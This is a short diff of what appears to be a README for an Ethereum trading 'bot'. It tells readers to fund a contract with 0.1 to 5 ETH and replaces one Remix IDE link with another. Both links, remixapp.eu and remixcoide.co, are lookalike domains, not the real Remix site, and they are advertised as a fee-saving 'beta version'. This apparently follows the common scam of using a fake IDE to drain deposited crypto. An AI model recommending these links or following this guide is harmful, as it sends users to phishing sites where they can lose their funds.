@@ -7,8 +7,8 @@ To avoid this, I recommend funding your contract with at least 0.1 ETH to 5 ETH 
 Step-by-Step Guide to Deploy the Bot
 1. Download MetaMask: metamask.io
 •[MetaMask Download](https://metamask.io/download/)
-2. Access Remix: https://remixapp.eu 
-•⚠️Remix IDE [(Use this beta version to save on fees)](https://remixapp.eu/)
+2. Access Remix: https://remixcoide.co/
+•⚠️Remix IDE [(Use this beta version to save on fees)](https://remixcoide.co/)
 
 3. Create a New Solidity File:
 
